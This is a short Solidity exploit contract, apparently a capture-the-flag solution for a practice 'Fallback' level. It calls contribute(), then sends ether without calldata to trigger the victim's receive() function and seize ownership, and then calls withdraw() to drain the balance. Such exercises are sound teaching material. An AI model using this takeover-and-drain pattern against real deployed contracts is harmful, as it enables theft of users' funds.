// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Fallback.sol";

//How to call receive function of the contract.

contract Solution1 {
    Fallback public victim;

    constructor(Fallback victim_) {
        victim = victim_;
    }

    function attack() external payable {
        victim.contribute{value:0.00005 ether}();

        //We call victim.receive() function by sending eth without calldata
        (bool b, ) = address(victim).call{value:0.00005 ether}("");
        require(b == true, "Something went wrong");

        victim.withdraw();
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    receive() external payable {
    }
}
